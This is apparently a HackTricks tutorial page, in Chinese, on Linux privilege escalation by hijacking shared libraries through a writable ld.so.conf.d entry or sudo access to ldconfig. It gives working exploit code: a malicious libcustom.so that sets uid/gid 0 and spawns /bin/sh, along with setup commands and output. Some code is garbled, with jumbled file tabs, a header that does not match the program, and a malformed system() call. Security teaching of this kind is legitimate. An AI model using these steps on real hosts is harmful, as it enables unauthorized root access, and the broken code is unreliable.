# ld.so特权升级漏洞示例

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 准备环境

在下面的部分，您可以找到我们将用于准备环境的文件的代码

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% tab title="libcustom.h" %}

```c
#ifndef LIBCUSTOM_H
#define LIBCUSTOM_H

void custom_function();

#endif
```

{% endtab %}
```c
#include <stdio.h>

void vuln_func();
```
{% tab title="libcustom.c" %}

```c
#include <stdio.h>

void custom_function() {
    printf("This is a custom function\n");
}
```

{% endtab %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% tabs %}
{% tab title="中文" %}
1. 在您的机器上的相同文件夹中**创建**这些文件
2. **编译**该**库**：`gcc -shared -o libcustom.so -fPIC libcustom.c`
3. 将`libcustom.so` **复制**到`/usr/lib`：`sudo cp libcustom.so /usr/lib`（需要root权限）
4. **编译**该**可执行文件**：`gcc sharedvuln.c -o sharedvuln -lcustom`

### 检查环境

检查_libcustom.so_是否从_/usr/lib_加载，并且您可以**执行**该二进制文件。
{% endtab %}
{% endtabs %}
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

在这个场景中，我们假设**有人在_/etc/ld.so.conf/_文件中创建了一个易受攻击的条目**：
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
易受攻击的文件夹是 _/home/ubuntu/lib_（我们具有可写访问权限）。\
**下载并编译**以下代码到该路径中：
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
现在我们已经在错误配置的路径中**创建了恶意的libcustom库**，我们需要等待**重新启动**或者等待root用户执行**`ldconfig`**（_如果你可以以**sudo**身份执行此二进制文件，或者它具有**suid位**，你将能够自己执行它_）。

一旦发生这种情况，**重新检查**`sharevuln`可执行文件从哪里加载`libcustom.so`库：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
正如你所看到的，它正在从 `/home/ubuntu/lib` 加载，并且如果任何用户执行它，将执行一个 shell：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
请注意，这个例子中我们没有提升权限，但是通过修改执行的命令并**等待root用户或其他特权用户执行易受攻击的二进制文件**，我们可以提升权限。
{% endhint %}

### 其他配置错误 - 相同的漏洞

在前面的例子中，我们伪造了一个配置错误，其中管理员**在`/etc/ld.so.conf.d/`目录下的配置文件中设置了一个非特权文件夹**。\
但是还有其他的配置错误可能导致相同的漏洞，如果您在`/etc/ld.so.conf.d`目录下的某个**配置文件**、`/etc/ld.so.conf.d`目录或`/etc/ld.so.conf`文件中具有**写权限**，您可以配置相同的漏洞并利用它。

## Exploit 2

**假设您对`ldconfig`拥有sudo特权**。\
您可以指定`ldconfig`**从哪里加载配置文件**，因此我们可以利用它来使`ldconfig`加载任意文件夹。\
因此，让我们创建所需的文件和文件夹以加载"/tmp"：
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
现在，如前面的漏洞所示，在`/tmp`目录下创建恶意库。\
最后，加载路径并检查二进制文件从哪里加载库：
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**正如你所看到的，如果你拥有对`ldconfig`的sudo权限，你可以利用同样的漏洞。**

{% hint style="info" %}
如果`ldconfig`配置了**suid位**，我**没有找到**可靠的利用方式来利用这个漏洞。会出现以下错误：`/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## 参考资料

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* HTB中的Dab机器

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
